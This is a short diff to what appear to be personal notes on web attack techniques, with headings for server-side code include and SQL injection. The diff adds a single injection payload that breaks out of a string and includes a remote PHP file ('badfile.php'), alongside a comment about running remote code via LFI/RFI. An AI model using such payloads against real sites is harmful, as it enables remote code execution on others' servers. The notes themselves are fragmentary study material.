@@ -10,6 +10,8 @@ GET https://status.github.com/messages
 
 Server Side Code include: 
 BADFILE #to run remote code, we must be able to upload a "BADFILE" and put it as a LFI / RFI ?
+";include("http://localhost/badfile.php?");echo"
+
 
 
 SQLI: 
